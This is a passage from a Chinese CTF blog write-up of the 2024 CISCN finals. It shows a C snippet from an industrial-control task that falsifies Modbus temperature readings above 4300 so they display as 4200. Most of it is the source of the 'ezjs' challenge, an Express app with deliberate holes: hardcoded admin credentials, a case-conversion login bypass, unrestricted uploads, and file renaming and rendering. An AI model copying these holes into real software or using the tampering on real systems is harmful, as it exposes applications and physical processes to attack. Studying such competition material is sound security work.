20</td><td>8130</td></tr></tbody></table><p>观察发现是小端存储，写一个检测</p><p>src&#x2F;security&#x2F;modbus_monitor&#x2F;modbus_monitor.c</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// 窃取数据和篡改数据的位置开始</span>                     <span class="token keyword">if</span><span class="token punctuation">(</span>Buf<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0x04</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>             <span class="token keyword">int</span> temperature <span class="token operator">=</span> <span class="token punctuation">(</span>Buf<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> Buf<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">;</span>             <span class="token keyword">if</span> <span class="token punctuation">(</span>temperature <span class="token operator">>=</span> <span class="token number">4300</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                 Buf<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x10</span><span class="token punctuation">;</span>                 Buf<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x68</span><span class="token punctuation">;</span>             <span class="token punctuation">&#125;</span>         <span class="token punctuation">&#125;</span> <span class="token comment">//窃取数据和篡改数据的位置结束</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重新编译，然后执行验证脚本</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240713165910986.png" alt="image-20240713165910986"></p><p>温度稳定显示在4200</p><hr><h2 id="访问控制模拟任务"><a href="#访问控制模拟任务" class="headerlink" title="访问控制模拟任务"></a>访问控制模拟任务</h2><p>后面两题交给队友了，我开摆（</p><h3 id="角色验证"><a href="#角色验证" class="headerlink" title="角色验证"></a>角色验证</h3><hr><h3 id="角色权限限制"><a href="#角色权限限制" class="headerlink" title="角色权限限制"></a>角色权限限制</h3><hr><h2 id="密码保护模拟任务"><a href="#密码保护模拟任务" class="headerlink" title="密码保护模拟任务"></a>密码保护模拟任务</h2><hr><h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><p>day1可信计算</p><p>day2车联网+工控</p><p>因为都没接触过所以这部分全交给队友们来做</p><hr><h1 id="AWDP"><a href="#AWDP" class="headerlink" title="AWDP"></a>AWDP</h1><p>被定式思维害了，第6轮开始我才修好js，按理来说15次提交机会上来就应该waf拉满赌一赌的</p><p>@chen那边也是修二打一，真厉害（川腔</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240720150051765.png" alt="image-20240720150051765"></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="ezjs"><a href="#ezjs" class="headerlink" title="ezjs"></a>ezjs</h2><p>break遗憾四血</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> ejs<span class="token operator">=</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'ejs'</span><span class="token punctuation">)</span><span class="token keyword">const</span> session <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-session'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> bodyParse <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> multer <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'multer'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"path"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">createDirectoriesForFilePath</span><span class="token punctuation">(</span><span class="token parameter">filePath</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> dirname <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">dirname</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token punctuation">;</span>    fs<span class="token punctuation">.</span><span class="token function">mkdirSync</span><span class="token punctuation">(</span>dirname<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">recursive</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">IfLogin</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> storage <span class="token operator">=</span> multer<span class="token punctuation">.</span><span class="token function">diskStorage</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token function-variable function">destination</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> file<span class="token punctuation">,</span> cb</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">cb</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'uploads'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 设置上传文件的目标目录</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token function-variable function">filename</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> file<span class="token punctuation">,</span> cb</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 直接使用原始文件名</span>        <span class="token function">cb</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> file<span class="token punctuation">.</span>originalname<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 配置 multer 上传中间件</span><span class="token keyword">const</span> upload <span class="token operator">=</span> <span class="token function">multer</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">storage</span><span class="token operator">:</span> storage<span class="token punctuation">,</span> <span class="token comment">// 使用自定义存储选项</span>    <span class="token function-variable function">fileFilter</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> file<span class="token punctuation">,</span> cb</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> fileExt <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">extname</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span>originalname<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>fileExt <span class="token operator">===</span> <span class="token string">'.ejs'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// 如果文件后缀为 .ejs，则拒绝上传该文件</span>            <span class="token keyword">return</span> <span class="token function">cb</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Upload of .ejs files is not allowed'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">cb</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 允许上传其他类型的文件</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>admin<span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token string-property property">"username"</span><span class="token operator">:</span><span class="token string">"ADMIN"</span><span class="token punctuation">,</span>    <span class="token string-property property">"password"</span><span class="token operator">:</span><span class="token string">"123456"</span><span class="token punctuation">&#125;</span>app<span class="token operator">=</span><span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'uploads'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParse<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">extended</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'view engine'</span><span class="token punctuation">,</span> <span class="token string">'ejs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">session</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">secret</span><span class="token operator">:</span> <span class="token string">'Can_U_hack_me?'</span><span class="token punctuation">,</span>    <span class="token literal-property property">resave</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>    <span class="token literal-property property">saveUninitialized</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    <span class="token literal-property property">cookie</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">maxAge</span><span class="token operator">:</span> <span class="token number">3600</span> <span class="token operator">*</span> <span class="token number">1000</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span>res</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> username<span class="token punctuation">,</span> password <span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>username <span class="token operator">===</span> <span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'you can not be admin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">const</span> new_username <span class="token operator">=</span> username<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>new_username <span class="token operator">===</span> admin<span class="token punctuation">.</span>username <span class="token operator">&amp;&amp;</span> password <span class="token operator">===</span> admin<span class="token punctuation">.</span>password<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user <span class="token operator">=</span> <span class="token string">"ADMIN"</span><span class="token punctuation">;</span>        res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/rename'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// res.redirect('/login');</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'upload'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span> upload<span class="token punctuation">.</span><span class="token function">single</span><span class="token punctuation">(</span><span class="token string">'fileInput'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>file<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'No file uploaded'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">const</span> fileExt <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">extname</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>file<span class="token punctuation">.</span>originalname<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fileExt <span class="token operator">===</span> <span class="token string">'.ejs'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Upload of .ejs files is not allowed'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'File uploaded successfully: '</span> <span class="token operator">+</span> req<span class="token punctuation">.</span>file<span class="token punctuation">.</span>originalname<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/render'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> filename <span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>filename<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Filename parameter is required'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">const</span> filePath <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'uploads'</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>filePath<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">'.ejs'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Invalid file type.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/rename'</span><span class="token punctuation">,</span>IfLogin<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user <span class="token operator">!==</span> <span class="token string">'ADMIN'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Access forbidden'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> oldPath <span class="token punctuation">,</span> newPath <span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>oldPath <span class="token operator">||</span> <span class="token operator">!</span>newPath<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Missing oldPath or newPath'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>newPath <span class="token operator">&amp;&amp;</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">app\.js|\\|\.ejs</span><span class="token regex-delimiter">/</span><span class="token regex-flags">i</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>newPath<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Invalid file name'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>oldPath <span class="token operator">&amp;&amp;</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\.\.|flag</span><span class="token regex-delimiter">/</span><span class="token regex-flags">i</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>oldPath<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Invalid file name'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">const</span> new_file <span class="token operator">=</span> newPath<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> oldFilePath <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'uploads'</span><span class="token punctuation">,</span> oldPath<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> newFilePath <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'uploads'</span><span class="token punctuation">,</span> new_file<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>newFilePath<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">'.ejs'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Invalid file type.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>oldPath<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'oldPath parameter is required'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>fs<span class="token punctuation">.</span><span class="token function">existsSync</span><span class="token punctuation">(</span>oldFilePath<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Old file not found'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">existsSync</span><span class="token punctuation">(</span>newFilePath<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">409</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'New file path already exists'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">createDirectoriesForFilePath</span><span class="token punctuation">(</span>newFilePath<span class="token punctuation">)</span>    fs<span class="token punctuation">.</span><span class="token function">rename</span><span class="token punctuation">(</span>oldFilePath<span class="token punctuation">,</span> newFilePath<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'Error renaming file:'</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Error renaming file'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'File renamed successfully'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token string">'3000'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">http://localhost:3000</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>package.json</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"express-file-upload-app"</span><span class="token punctuation">,</span>  <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"1.0.0"</span><span class="token punctuation">,</span>  <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"ezjs"</span><span class="token punctuation">,</span>  <span class="token property">"main"</span><span class="token operator">:</span> <span class="token string">"app.js"</span><span class="token punctuation">,</span>  <span class="token property">"scripts"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token 